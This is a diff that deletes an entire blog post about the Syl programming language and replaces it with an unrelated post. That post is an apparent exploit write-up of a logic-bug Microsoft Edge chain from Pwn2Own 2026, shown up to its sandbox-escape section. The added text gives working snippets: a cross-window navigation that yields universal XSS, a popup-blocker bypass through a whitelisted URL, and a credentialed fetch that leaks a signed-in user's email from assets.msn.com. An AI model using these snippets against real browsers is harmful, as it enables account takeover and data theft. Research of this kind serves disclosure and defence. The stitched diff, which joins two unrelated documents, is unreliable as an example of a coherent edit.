@@ -1,476 +1,462 @@
-It seems inevitable that compile-time dependent types will come to systems programming.  
-C++ has templates and `constexpr`. Rust has const generics. Zig has `comptime`. Even C has `_Generic`.
-However, these features tend to be highly restricted, lack a proper type system, or both.
-
-I’m working on [Syl](https://syl.dev/), a language which aims to encode compile-time computation in a modal type system.
-Syl is primarily inspired by András Kovács’ work on [two-level](https://andraskovacs.github.io/pdfs/2ltt.pdf) [type theory](https://andraskovacs.github.io/pdfs/2ltt_icfp24.pdf), as well as plans for [OxCaml](https://oxcaml.org/).
-
-*The Syl compiler may be found on [GitHub](https://github.com/TheNumbat/Syl).*
-
-## Modes
-
-In Syl, all values have a *mode* along with a type.
-Modes describe properties of values independent of their types.
-For example, [OxCaml uses modes](https://oxcaml.org/documentation/modes/intro/) to indicate whether a value is uniquely owned, may be written to, may be sent to another thread, etc.<sup>[1](https://thenumb.at/Syl-Intro/#fn:1)</sup>
-
-Syl has two mode axes: *staticity* and *erasure*.
-On the staticity axis, a value may be either `static` or `dynamic`.
-On erasure, either `erased` or `unerased`.
-
-- A static value is knowable at compile time; a dynamic value may not be.
-- An unerased value is knowable at runtime; an erased value may not be.
-
-For example, literals are `static unerased`, since they are clearly knowable at both compile time and runtime.
-You can check by writing a mode annotation:
-
-```text
-let x = 0 @ static unerased;;
-```
-
-Each mode axis has a sub-moding relation.
-If you have a `static` value, it’s safe to forget that it is knowable at compile time and hence treat it as `dynamic`.
-Similarly, an `unerased` value may be treated as `erased`.
-Mode annotations may “weaken” the mode, but not “strengthen” it:
-
-```text
-let x = 0 @ dynamic;;
-
-let y = x @ static;;
-        ^^^^^^^^^^
-Error: Expected a static expression, but got dynamic.
-```
-
-As you might expect, branching on a `dynamic` value causes the result to be `dynamic`.
-
-```text
-let x = 0 @ dynamic;;
-
-let y = (if x == 0 then 1 else 2) @ static;;
-        ^^^^^^^^^^^^^^^^^^^^^^^^
-Error: Expected a static expression, but got dynamic.
-```
-
-As long as they don’t capture or branch on `dynamic` values, functions preserve staticity.<sup>[2](https://thenumb.at/Syl-Intro/#fn:2)</sup>
-
-```text
-let f = fn (x : int) -> x;;
-
-let x = (f 0) @ static;;
-
-let y = (f (1 @ dynamic)) @ static;;
-        ^^^^^^^^^^^^^^^^^
-Error: Expected a static expression, but got dynamic.
-```
-
-Functions that return `erased` values are themselves `erased`, so cannot be applied at runtime.
-
-```text
-let f = fn (x : unit) -> 1 @ erased;;
-
-let g = f @ unerased;;
-        ^
-Error: Expected an unerased expression, but got erased.
-```
-
-Now, what can we do with this information?
-When a value is knowable at compile time, surrounding code can be *monomorphized*.
-Functions of `static` parameters take advantage of this fact:
-
-```text
-let f = fn (static x : bool) -> print_bool x;;
-```
-
-Whenever we call `f x`, the compiler requires that both `f` and `x` have mode `static`.
-If they do, it selects a particular implementation of `f` specialized to the value of `x`.
-Concretely, `f true` would call a function that hard-codes `print_bool true`, and likewise for `f false`.
-
-In this example, we’re printing the value of `x` at runtime, so it needs to be `unerased`.
-That’s often unnecessary: if `x` only determines how to compile the body of `f`, it can be `erased`.
-
-```text
-let f = fn (erased x : bool) -> if erased x then print_int 0 else print_int 1;;
-```
-
-Here, `erased` also implies `static`, so `f` will be specialized on `x`.
-The `if erased` expression accepts a `static erased` condition and is guaranteed to resolve at compile time.
-Therefore, `f true` refers to a thunk with the body `print_int 0`, and likewise for `f false`.
-
-## Dependent Types
-
-On their own, the `static` and `erased` modes let us explicitly request specialization-based optimizations,
-but they don’t give us dependent types. Functions of `static` arguments do.
-
-```text
-let f = fn (erased x : bool) -> if erased x then 0 else true;;
-```
-
-Here, `if erased` allows us to return an integer if `x` is true and a boolean otherwise.
-Hence, `f` has a dependent function type, which encodes how the result type depends on the *value* of the input.
-
-```text
-f : erased bool as x -> if erased x then int else bool
-```
-
-Note `ty as name` gives the argument a name for use in the result.
-
-Applications can then determine the correct result type by evaluating `f`’s type.
-
-```text
-let x = (f true) : int;;
-
-let y = (f false) : bool;;
-```
-
-There is no distinct type grammar: type formers like `->` and type annotations are normal expressions.
-`int` and `bool` are just `erased` values of type `type`, and abstracting over them gives us polymorphism.
-
-```text
-let id = fn (erased t : type) -> fn (x : t) -> x;;
-
-let x = id int 0;;
-
-let y = id bool true;;
-```
-
-As we saw above, functions of `static` arguments are monomorphized.
-At runtime, `id int` refers to an identity function that directly operates on integers, and likewise for `id bool`.
-
-That is, Syl is **dependently typed at compile time and simply typed at runtime.**<sup>[3](https://thenumb.at/Syl-Intro/#fn:3)</sup>
-
-- Constructs that determine the shape of the runtime program require `static` information.
-- Types are always `erased`, so the runtime program cannot inspect types.
-
-Syl implements dependent typechecking similarly to existing languages, so we won’t discuss it in detail.
-However, the relationship between types and propositions in Syl differs from that of languages like Lean, Rocq, and Agda.
-
-### Proofs
-
-In particular, Syl supports general recursion in compile time computations and gives `type` type `type`.
-Allowing either of these features implies that constructing an expression of type `t` does **not** prove the proposition corresponding to `t`.
-
-For example, we can implement a function that ostensibly returns a value of any type:
-
-```text
-let magic =
-  fn (erased t : type) ->
-    fun loop (_ : unit) : t = loop () in
-    loop ()
-;;
-```
-
-Note `magic` could also be implemented using `type : type` via [Girard’s paradox](https://ncatlab.org/nlab/show/Burali-Forti%27s+paradox).
-
-Despite having type `erased type as t -> t`, this function never actually produces a value—it’s an infinite loop.
-The type describes what `magic t` would produce if it completed, but does not guarantee that it does.
-
-Although this type system would not be suitable for a theorem proving language, it does *not* rule out type safety or even useful proofs.
-It has two practical consequences:
-
-- Functions used in type-level computations may diverge, so typechecking is not decidable.
-- Functions don’t discharge universally quantified claims, so the compiler must evaluate all applications that produce proofs before relying on their results.<sup>[4](https://thenumb.at/Syl-Intro/#fn:4)</sup><sup>[5](https://thenumb.at/Syl-Intro/#fn:5)</sup>
-
-In return, we don’t need a totality checker (all `static` expressions may be used in types) or universe machinery (type-level programming is intuitive).
-
-### Totality
-
-Because Syl is a *programming language*, the point of compilation is to produce a runtime artifact satisfying the invariants enforced by the type system.
-Therefore, we only care about invocations of dependent functions that actually occur during compilation—it’s fine for others to diverge.
-
-Still, typechecking getting stuck during development is a poor user experience, so Syl also implements fuel limits.
-Given competent compile-time debugging tools, I think this is reasonable.
-
-```text
-fun f (erased _ : unit) : erased type = f ();;
-                                        ^
-Error: Recursion limit reached.
-
-let x = 1 : f ();;
-```
-
-Eschewing totality also means Syl can support explicitly partial functions at little additional cost.
-For example, here’s a division function that statically checks the divisor is non-zero:
-
-```text
-let safe_div =
-  fn (static d : int) ->
-    if erased d != 0
-    then fn (x : int) -> x / d
-    else unreachable
-;;
-```
-
-The `unreachable` keyword asserts that a branch does not appear in the runtime program.
-During dependent typechecking, the `else` branch is treated as a bottom value, so imposes no restrictions on the `then` branch.
-However, if `else` is reached while instantiating `safe_div`, we get an error:
-
-```text
-    ...
-    else unreachable
-         ^^^^^^^^^^^
-Error: Unreachable reached.
-;;
-
-let x = safe_div 0 1;;
-```
-
-Allowing partial functions reopens the door to inscrutable C++-style template instantiation errors.
-Luckily, explicit partiality means we can require users to provide error messages in unsupported cases, and combined with the lack of duck-typing at compile time, I think Syl can avoid most of the downsides.
-
-## Examples
-
-### Typed Interpreter
-
-The following program does not require the full power of dependent types—it’s often used as a motivating example for GADTs in OCaml or Haskell—but I think the comparison is illustrative.
-
-We’ll start by defining a variant to use as an index.
-
-```text
-let sort = variant { int, bool };;
-```
-
-*Notes: Both `sort` and its constructors `sort.int`/`sort.bool` are normal values. Variants are unboxed.*
-
-Then a function to convert a `sort` to the corresponding type.
-
-```text
-fun value (erased s : sort) : erased type =
-  match erased s {
-    .int -> int,
-    .bool -> bool,
-  }
-;;
-```
-
-*Note: like `if erased`, `match erased` allows an `erased` scrutinee and is resolved at compile time.*
-
-Next, an indexed expression type.
-The type is literally a recursive function with a `sort` argument:
-
-```text
-fun expr (erased s : sort) : erased type =
-  match erased s {
-    .int ->
-      variant {
-        lit : int,
-        add : &(expr sort.int ^ expr sort.int),
-        if_ : &(expr sort.bool ^ expr sort.int ^ expr sort.int),
-      },
-    .bool ->
-      variant {
-        lit : bool,
-        eq : &(expr sort.int ^ expr sort.int),
-      },
-  }
-;;
-```
-
-*Notes: `&` represents an indirection. `^` is the tuple type former.*
-
-Finally, the interpreter.
-In the `.int` branch, the compiler knows that only the `int`-returning constructors appear, and likewise for `.bool`.
-
-```text
-fun eval (erased s : sort) : expr s -> value s =
-  fn (e : expr s) ->
-    match erased s {
-      .int ->
-        match e {
-          .lit n -> n,
-          .add &(left, right) -> eval sort.int left + eval sort.int right,
-          .if_ &(condition, yes, no) ->
-            if eval sort.bool condition then eval sort.int yes else eval sort.int no,
-        },
-      .bool ->
-        match e {
-          .lit b -> b,
-          .eq &(left, right) -> eval sort.int left == eval sort.int right,
-        },
-    }
-;;
-```
-
-Functions of `static` arguments are monomorphized and `erased` branches are eliminated, so the interpreter compiles to the same structure you’d expect from template specialization in C++.<sup>[6](https://thenumb.at/Syl-Intro/#fn:6)</sup>
-
-### Length-Indexed Vector
-
-*Warning: the syntax here needs a lot of work.*
-
-Proper dependent types enable us to encode the length of lists in the type system.
-Let’s write an `append` function whose type shows that the output length is the sum of the input lengths.
-
-While we could index our list by an `int`, Syl lacks tools for reasoning about signed, fixed-width integers.
-Instead, let’s define our own Peano `nat` type.
-
-```text
-let nat =
-  fun nat (erased _ : unit) : erased type =
-    variant { zero, succ : &(nat ()) }
-  in
-  nat ()
-;;
-```
-
-*Note: there’s no `let rec`, so we define `nat` via a recursive function.*
-
-```text
-fun add (static nm : nat ^ nat) : nat =
-  match static nm {
-    (.zero, m) -> m,
-    (.succ &n, m) -> nat.succ box (add (n, m)),
-  }
-;;
-```
-
-*Notes: `match static` is like `match erased` but does not erase the contents of the scrutinee. We should use `erased` everywhere, but variant constructors are not yet mode-polymorphic. If all `nat`s were erased, the `box` indirection also wouldn’t be necessary.*
-
-Now the unboxed, length-indexed list.
-Note the lack of indirection.
-
-```text
-fun vec (erased t : type) : erased (erased nat -> erased type) =
-  fn (erased n : nat) ->
-    match erased n {
-      .zero -> variant { nil },
-      .succ &n -> variant { cons : t ^ vec t n },
-    }
-;;
-```
-
-Finally, the `append` function.
-Crucially, the compiler is able to infer that the `.cons` case has the correct return type by unfolding `add` and `vec`.
-
-```text
-fun append
-  (erased t : type) : (static nat as n
-                         -> static nat as m
-                         -> vec t n
-                         -> vec t m
-                         -> vec t (add (n, m))) =
-  fn (static n : nat) ->
-    fn (static m : nat) ->
-      fn (v1 : vec t n) ->
-        fn (v2 : vec t m) ->
-          match static n {
-            .zero -> v2,
-            .succ &n_minus_1 ->
-              match v1 {
-                .cons (x, xs) -> (vec t (add (n, m))).cons (x, append t n_minus_1 m xs v2),
-              },
-          }
-;;
-```
-
-*Notes: this is rather verbose since we don’t have n-ary function syntax. We also have to fully qualify the `vec` type `.cons` comes from because it’s not inferred yet.*
-
-As above, all lengths are known at compile time, so the runtime program has semantics akin to a `constexpr` length computation in C++ (though the `unerased` lengths may be materialized).
-
-## Extensions
-
-Many useful language features can be defined in user code using compile-time dependent types.
-Here are few promising (partially implemented) examples.
-
-### Higher-Kinded Types
-
-Higher-kinded types are just `erased` functions on types.
-You can abstract over them like anything else.
-
-```text
-singleton :
-    erased (erased type -> erased type) as container ->
-    erased type as element ->
-    element ->
-    container element
-```
-
-This example already works, but as written, all you can do with `container` is apply it.
-We also need the ability to specify interfaces that connect types and values, leading to…
-
-### Modules and Functors
-
-Once Syl has [OxCaml-style modalities](https://oxcaml.org/documentation/modes/reference/#modalities)<sup>[7](https://thenumb.at/Syl-Intro/#fn:7)</sup>, you’ll be able to nest `erased`/`dynamic` values inside `unerased`/`static` values.
-Then dependent records can take the place of ML-style modules:
-
-```text
-let container = record {
-  ty : erased type -> erased type @@ erased,
-  create : erased type as element -> element -> ty element,
-};;
-```
-
-Note `@@ erased` implies that all uses of `container.ty` see an `erased` value regardless of the erasure of `container`.
-Now we can give `singleton` an implementable type:
-
-```text
-singleton :
-    static container as container ->
-    erased type as element ->
-    element ->
-    container.ty element
-```
-
-Similarly, ML-style functors can be implemented as dependent functions:
-
-```text
-fun pair (static c : container) : container = {
-  ty = (fn (erased element : type) ->
-         c.ty element ^ c.ty element),
-  create = (fn (erased element : type) ->
-             fn (e : element) ->
-               c.create element e, c.create element e),
-};;
-```
-
-Finally, with inferred arguments, records could provide most of the affordances of typeclasses or traits.
-
-### Imports
-
-We can even use static computation to describe how multi-file programs are built.
-The compiler just has to provide the following functions:
-
-```text
-import_sig : erased string -> erased type
-import : erased string as path -> import_sig path
-```
-
-If we treat file-level definitions as record fields, `import_sig` can infer a record type for a file and `import` can produce a value of that type.
-In fact, these functions could just as easily take code strings, letting us generate code at compile time!
-
-### Reflection
-
-Syl already has rudimentary reflection via the built-in `repr` function, which returns metadata for a type.
-
-```text
-fun print_ty (erased t : type) : unit =
-  match erased repr t {
-    .unit -> print "unit",
-    .bool -> print "bool",
-    .int -> print "int",
-    _ -> unreachable,
-  }
-;;
-```
-
-This facility could be straightforwardly extended to allow inspecting the structure of types, which could then be used to implement typed Rust or OCaml-style derivers.
-
-### User-Defined Layouts
-
-While fairly speculative, I think we should be able to define and manipulate types’ runtime layouts at compile time.
-With such a feature, users could safely describe interoperable niche optimizations, possibly in the style of [*Bit-Stealing Made Legal*](https://inria.hal.science/hal-04165615v1/document).
-This would also require some notion of “unaddressable” fields that do not allow creating pointers to them.
-
-## Everything Else
-
-Syl’s design is far from complete.
-In particular, it needs stories for mode polymorphism, lifetimes, linearity, implicit parameters, and proofs.
-The compiler needs incremental compilation, useful error traces, and an LLVM backend.
-I hope to share more thoughts on these areas in the future.
-
-# Footnotes
-
-1. In the literature, modal type systems are presented in terms of modalities. We will describe modes as they appear in OxCaml, but you can translate by thinking of all values as `static unerased` until captured under a `dynamic` or `erased` modality. [↩︎](https://thenumb.at/Syl-Intro/#fnref:1)
-2. Currently, staticity has modal axiom K, which allows staticity-preserving functions to operate on dynamic arguments. I plan to replace the implicit application rule with mode polymorphism, which can also handle erasure. [↩︎](https://thenumb.at/Syl-Intro/#fnref:2)
-3. This is the core idea of [*Staged Compilation with Two-Level Type Theory*](https://andraskovacs.github.io/pdfs/2ltt.pdf), though it’s not presented as a modal type system. [↩︎](https://thenumb.at/Syl-Intro/#fnref:3)
-4. This idea is formally explored in [*Irrelevance, Heterogeneous Equality, and Call-by-value Dependent Type Systems*](https://www.cis.upenn.edu/~sweirich/papers/msfp12prog.pdf). Thanks to Chris for proofreading this post! [↩︎](https://thenumb.at/Syl-Intro/#fnref:4)
-5. Syl does not yet have equality types, but once it does, erasure will provide a natural mechanism for forcing proof-producing computations when their results are needed. For example, `assert erased b` could establish `b = true` in the proof context by checking it reduces to `true`. [↩︎](https://thenumb.at/Syl-Intro/#fnref:5)
-6. This isn’t a fair comparison, but it’s better! [C++](https://godbolt.org/z/zP3Y9PjMG) / [Syl](https://pastebin.com/BNrfcP8B). [↩︎](https://thenumb.at/Syl-Intro/#fnref:6)
-7. There exist ideas on how to make such modalities inferrable, but I don’t understand them yet. [↩︎](https://thenumb.at/Syl-Intro/#fnref:7)
+I think I should still dump some of my work once in a while, even though it feels like fewer and fewer people actually sit down and read articles these days (or maybe now they all leave it to their agents XD). Anyway, this is what I built for Pwn2Own Berlin 2026 — a completely handmade, logic-only Microsoft Edge Full Chain, with no memory corruption, and no AI at all! 🔥
+
+> Confirmed! Orange Tsai (@orange_8361) of DEVCORE Research Team (@d3vc0r3) chained 4 logic bugs to achieve a sandbox escape on Microsoft Edge, earning $175,000 and 17.5 Master of Pwn points. Full win! #Pwn2Own #P2OBerlin https://t.co/vJaIpGG4cD
+
+The whole chain is made up of five bugs and two Windows features. I have also shared the whole bug-hunting and chaining process at this year’s HITCON and Hexacon, plus some fun stories along the way. You can check [the slides here](https://github.com/orangetw/My-Presentation-Slides/blob/main/data/2026-The-Last-Proof-of-Human-Craft-en.pdf)!
+
+Also, maybe everyone thinks LLMs can already pwn everything in the AI era, so something made entirely by hand somehow feels a bit more precious. That might also be why this chain was nominated for this year’s Pwnie Awards and won the Epic Achievement award. 🎉
+
+![pwnie-award-2026](https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/pwnie-award-2026.webp)
+
+So where do we start with a logic-only full chain? Well, since it’s a “browser,” let’s start by looking at how “browsing” (or what Chromium calls “navigation”) works. I won’t go into too much detail in this post, because I think in this era, you can just ask your agents to fill in the details :)
+
+But I’d still recommend reading “[Life of a Navigation](https://docs.google.com/presentation/d/1YVqDmbXI0cllpfXD7TuewiexDNZYfwk6fRdmoXJbBlM/edit)“ from Chrome University if you want to get the full picture.
+
+While I was walking through the Chromium Navigation flow, something called “Navigation Throttles” caught my attention. They live in the Browser Process, and intercept all navigation requests initiated by either the Browser or the Renderer. Maybe it’s easy to say this in hindsight, but out of the 3,000+ CVEs Google Chrome has fixed over the past five years, there are only fewer than 20 related to them. So I guess this is also a corner not too many people pay attention to.
+
+Anyway, I started digging into the Navigation Throttles, and checked how Google Chrome and Microsoft Edge implemented them. And while going through the code, I found that Edge has a throttle called `EdgeCAGuidanceNavigationThrottle` for its enterprise Entra ID feature (the `CA` here stands for [Conditional Access](https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview)). The purpose of this throttle is to guide users to the right User Profile when Edge detects them signing in with a work account on a Microsoft website. And to fire this throttle, you have to start a navigation from a specific Microsoft-owned origin, such as `login.live.com`:
+
+1  
+location.href = `https://guidance-ca-error/?email={email}&switch_profile={url}`
+
+And once the throttle is fired, Edge would compare the email of the current User Profile with `?email={email}`. If they don’t match, Edge pops up a dialog guiding you to switch accounts.
+
+![image](https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/ba80963f-b4cb-4268-8c07-85b91cf4fa28.png)
+
+But if they do match, Edge would then grab the URL you were originally heading to from `switch_profile={url}`, and launch a new navigation with Chromium’s internal Navigation API:
+
+1  
+2  
+3  
+4  
+5  
+NavigateParams params(browser, switch_profile_url, ui::PAGE_TRANSITION_LINK);  
+params.disposition = WindowOpenDisposition::CURRENT_TAB;  
+params.window_action = NavigateParams::SHOW_WINDOW;  
+
+Navigate(&params);
+
+So basically, the throttle cancels the original navigation when the target URL matches a specific internal format, and then launches a new one with the URL from the attacker-controlled Query String, if the conditions are met. Since this new navigation is initiated by the Browser Process, in theory we can do a few things we couldn’t do before, such as jumping to normally prohibited pages like `edge://settings` or `devtools://...`, or even pseudo-schemes like `javascript:alert(origin)`.
+
+Though the JavaScript pseudo-scheme sounds like a powerful primitive, you still need to obtain the Execution Context on `login.live.com` to fire the throttle in the first place. So being able to jump to `javascript:` doesn’t really give you any extra capability. At most, it’s just like a Self-XSS, or a way to turn an Open Redirect there into XSS. Either way, you’re still only executing JavaScript in the same `login.live.com` context.
+
+Honestly, I didn’t take this bug too seriously at first glance. To me, it was just a stronger Open Redirect that could jump to a few more Browser-Level Schemes, and still needed to be chained with other bugs. So the bug just sat in my notes for weeks… 🤦‍♂️
+
+The turning point was when I was going over the Chromium architecture one day and started thinking: The throttle is handled in the Browser Process, so the new navigation is initiated from the browser as well. However, the page we fired the throttle from, `login.live.com`, lives in the Renderer, and while investigating the logic, I couldn’t find any code tying the Browser and Renderer together. So… `CURRENT_TAB` refers to which tab, exactly?
+
+To find this out, I ran a quick test and added a delay to the original trigger:
+
+1  
+2  
+3  
+setTimeout(function(){  
+    location.href = `https://guidance-ca-error/?email={email}&switch_profile={url}`  
+}, 8000)
+
+And during the delay, we manually switched the Edge to a new tab to see what would happen, and…
+
+Boom! We got a UXSS on `google.com`, and that’s also the first bug of the whole chain. To fully understand the UXSS root cause, we dug into Chromium’s source code. We found that if `Navigate()` is called without specifying the `source_contents` (the Renderer source to bind to), Chromium would use the current active tab as the Renderer source automatically.
+
+*↓ **Path:** [chromium/chrome/browser/ui/browser_navigator.cc](https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:chrome/browser/ui/browser_navigator.cc)*
+
+1  
+2  
+3  
+4  
+5  
+6  
+7  
+8  
+9  
+10  
+11  
+12  
+13  
+14  
+15  
+16  
+17  
+18  
+19  
+20  
+21  
+22  
+23  
+24  
+25  
+26  
+27  
+28  
+29  
+30  
+31  
+32  
+33  
+34  
+35  
+36  
+37  
+38  
+39  
+40  
+41  
+42  
+43  
+44  
+45  
+46  
+base::WeakPtr<content::NavigationHandle> Navigate(NavigateParams* params) {  
+
+  // [...]  
+
+  // If no source WebContents was specified, we use the selected one from the  
+  // target browser. This must happen before GetBrowserAndTabForDisposition()  
+  // has a chance to replace |params->browser| with another one, but after the  
+  // above check that relies on the original source_contents value.  
+  if (!params->source_contents && params->browser) {  
+    params->source_contents = params->browser  
+                  ->GetBrowserForMigrationOnly()  
+                  ->tab_strip_model()  
+                  ->GetActiveWebContents(); // <--- [1] Use the active tab as the navigation source  
+  }  
+
+  // [...]  
+
+  // If no target WebContents was specified (and we didn't seek and find a  
+  // singleton), we need to construct one if we are supposed to target a new  
+  // tab.  
+  if (!contents_to_navigate_or_insert) {  
+    DCHECK(!params->url.is_empty());  
+    if (params->disposition != WindowOpenDisposition::CURRENT_TAB) {  
+      // [...]  
+    } else {  
+      // ... otherwise if we're loading in the current tab, the target is the  
+      // same as the source.  
+      DCHECK(params->source_contents);  
+      contents_to_navigate_or_insert = params->source_contents;   // <--- [2] Set it as the target WebContents  
+    }  
+
+    // Try to handle non-navigational URLs that popup dialogs and such, these  
+    // should not actually navigate.  
+    if (!HandleNonNavigationAboutURL(  
+            params->url, contents_to_navigate_or_insert->GetBrowserContext())) {  
+      // Perform the actual navigation, tracking whether it came from the  
+      // renderer.  
+      NavigationController::LoadURLParams load_url_params =  
+          LoadURLParamsFromNavigateParams(contents_to_navigate_or_insert,  
+                                          params);  
+      navigation_handle =  
+          contents_to_navigate_or_insert->GetController().LoadURLWithParams(  
+              load_url_params);     // <--- [3] Start navigation; dispatch Mojo downstream  
+    }  
+  // [...]  
+}
+
+Though the code path requires `params.disposition` to be `CURRENT_TAB` and `params.source_contents` to be `NULL`, luckily, those are the defaults, so even Chromium’s own [example code](https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:chrome/browser/ui/browser_navigator_params.h;l=54) gets this wrong. I guess this should count as a new UXSS attack surface!
+
+The UXSS primitive we just got sounds great, but firing that still comes with quite a few challenges in practice. Here we list four we faced while weaponizing the UXSS, and how we cracked them with more and more bugs 😉.
+
+The first challenge, as we mentioned earlier: this UXSS has to be fired from certain Microsoft sites. Though we could still find an XSS there to make that happen, that sounds like a painful job, so we’d keep it as a last resort. Instead, we decided to see if there was any low-hanging fruit in the origin check first.
+
+1  
+2  
+3  
+4  
+5  
+content::WebContents* web_contents = navigation_handle()->GetWebContents();  
+const GURL last_committed_url = web_contents->GetLastCommittedURL();  
+
+if ( !IsSupportedLoginUrl(last_committed_url) )  
+    return content::NavigationThrottle::CANCEL_AND_IGNORE;
+
+We found that `EdgeCAGuidanceNavigationThrottle` uses `GetLastCommittedURL()` to retrieve the origin that fired the navigation, and then check it. At first glance, this looks like the correct way to do the validation. But take a second look, and you’ll notice Microsoft seems to have forgotten that a navigation can come not just from the current `WebContents`, but also from another window… So a simple `window.open(...)` is enough to bypass it!
+
+*↓ You can run this on any website to fire the throttle*
+
+1  
+2  
+popup = window.open('https://login.live.com/', '_blank')  
+popup.location = `https://guidance-ca-error/?email={email}&switch_profile={url}`
+
+So far, we can bypass the origin check with a cross-window navigation. However, modern browsers don’t let webpages open new windows that easily nowadays, so here comes another new problem: the [Popup Blocker](https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:components/blocked_content/popup_blocker.cc) would block `window.open(...)` by default.
+
+![popup-blocker](https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/2026-10-27_125828.png)
+
+To crack this, we kept reversing Microsoft Edge. And we found Microsoft, maybe for internal use, made its own hardcoded whitelist for popups… So a popup like the following would normally be blocked as expected:
+
+1  
+popup = window.open('https://malicious.tld', '_blank')      // blocked
+
+But if you swap the URL for the whitelisted one… the window just appears. And then remember to navigate it back to the original site, and you’ve bypassed the Popup Blocker!
+
+1  
+2  
+popup = window.open('about:blank#quickAuthPopup', '_blank') // granted  
+popup.location = 'https://malicious.tld'
+
+Thank you, Microsoft!
+
+![thanks-microsoft](https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/1b103d19-bad0-4449-9c1c-d207bce67376.webp)
+
+Now that we can fire `EdgeCAGuidanceNavigationThrottle` from wherever we want, the next step is to get past the Conditional Access checks. The code first requires Microsoft Edge to already have a signed-in User Profile, and then checks if `?email={email}` matches the profile’s email. Both conditions have to be met before we reach the sourceless, browser-initiated navigation to finally trigger our UXSS primitive.
+
+1  
+2  
+3  
+4  
+5  
+6  
+7  
+8  
+9  
+10  
+Profile* current_profile = Profile::FromBrowserContext(  
+    web_contents->GetBrowserContext());  
+
+std::string email;  
+net::GetValueForKeyInQuery(target_url, kEmailQueryKey, &email);  
+
+const base::FilePath target_profile_path = GetPathOfProfileWithEmail(email);  
+if (current_profile->GetPath() != target_profile_path) {  
+    profiles::SwitchToProfile(target_profile_path, false, BindOnce(…));  
+}
+
+However, since we can’t assume the target environment has a signed-in profile in advance, we still need to find a way to make the attack work even if it doesn’t. While exploring Microsoft Edge, we came across a great feature called “OneAuth”. The feature lets any Edge WebView application automatically sign in with your current MSA credentials when visiting Microsoft-owned sites. And it turns out that starting with 25H2, [Windows OOBE](https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/customize-oobe-in-windows-11) requires you to sign in with an MSA (unless you use the local-account workaround). So even if you’ve never created a User Profile in the browser, just visiting `www.microsoft.com` is enough for Edge to create one and sign you in automatically.
+
+Thanks again, Microsoft!
+
+With the sign-in issue cracked, the last challenge is to get the victim’s email in advance. Of course, we could try some social engineering, or keep reversing Microsoft Edge to find another bug that leaks that for us. But since the automatic sign-in already sets several Microsoft cookies, we thought Web Hacking would be an easier way to steal the email. So we fired up Burp Suite and started looking for web vulnerabilities.
+
+We spent a few hours and found several XSS bugs on Microsoft sites. While poking around, I noticed that `assets.msn.com`, which is embedded in `edge://new-tab-page-online`, returns the currently signed-in user’s email. And even more interesting, when I checked the response header, the site seemed to have a CORS misconfiguration…
+
+![cors-misconfig](https://blog.orange.tw/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/2026-10-28_153010.png)
+
+So with a simple `fetch(...)` with credentials included, you can easily grab any Microsoft Edge user’s email from any website:
+
+1  
+2  
+3  
+4  
+5  
+6  
+7  
+8  
+9  
+10  
+11  
+resp = await fetch(`https://assets.msn.com/service/community/users/me?profile=social&it=edgeid`, {  
+    method: 'GET',   
+    mode: 'cors',  
+    credentials: 'include',  
+    referrerPolicy: 'no-referrer',  
+    headers: {  
+        'Accept': 'application/json'  
+    }  
+})  
+body = await resp.json()  
+console.log( body.value[0].email )
+
+So far, to make this primitive work, we’ve chained together:
+
+- A Trusted Origin bypass caused by a missing cross-window Opener check
+- A Popup Blocker bypass caused by a hardcoded whitelist
+- A OneAuth feature that automatically signs you in
+- A CORS misconfiguration that lets us steal the signed-in user’s email
+
+Now we can finally trigger the UXSS without a single click! And even better, since this UXSS is initiated from the Browser Process (`HandleRendererDebugURL` in Mojo, if you’re interested), it can ignore any CSP entirely. That means we can run JavaScript on `google.com`, `facebook.com`, `icloud.com`, or whatever website we want!
+
+# Breaking Out of the Browser Sandbox
+
+So we have a Universal XSS. Does it mean that we can do whatever we want? If we’re talking about Web Security, then yes. But our goal here is to get ACE (Arbitrary Code Execution), so UXSS alone is far from enough. And we still need to find a way to break out of the Browser Sandbox to turn this UXSS into code execution.
+
+The first and most straightforward idea that came to my mind was: since we can run JavaScript on any website, or more precisely, any origin, why not just leverage privileged WebUI pages like `edge://settings` or `edge://downloads` to get ACE?
+
+This naive approach was of course already mitigated by the Chromium developers. In the Renderer’s Mojo handler, there’s an extra check: if the origin belongs to one of the following privileged WebUIs, the Renderer simply ignores the JavaScript URL.
+
+1  
+2  
+3  
+4  
+5  
+6  
+7  
+8  
+9  
+10  
+edge  
+chrome-extension  
+chrome  
+chrome-untrusted  
+chrome-distiller  
+chrome-error  
+chrome-native  
+chrome-search  
+devtools  
+// more...
+
+*↓ **Path:** [chromium/third_party/blink/renderer/core/frame/local_frame.cc](https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:third_party/blink/renderer/core/frame/local_frame.cc)*
+
+1  
+2  
+3  
+4  
+5  
+6  
+7  
+8  
+9  
+10  
+11  
+12  
+void LocalFrame::LoadJavaScriptURL(const KURL& url) {  
+  // Protect privileged pages against bookmarklets and other JavaScript  
+  // manipulations.  
+  if (SchemeRegistry::ShouldTreatURLSchemeAsNotAllowingJavascriptURLs(  
+          GetSecurityContext()  
+              ->GetSecurityOrigin()  
+              ->GetOriginOrPrecursorOriginIfOpaque()  
+              ->Protocol())) {  
+    return;  
+  }  
+  // [...]  
+}
+
+1  
+2  
+3  
+4  
+5  
+6  
+7  
+8  
+bool SchemeRegistry::ShouldTreatURLSchemeAsNotAllowingJavascriptURLs(  
+    const String& scheme) {  
+  DCHECK_EQ(scheme, scheme.LowerASCII());  
+  if (scheme.empty())  
+    return false;  
+  return GetURLSchemesRegistry().not_allowing_javascript_urls_schemes.Contains(  
+      scheme);  
+}
+
+Basically, Chromium has put every privileged WebUI you can think of on the `not_allowing_javascript_urls_schemes` blacklist. So at that point, I still got stuck for a long while. 😖
+
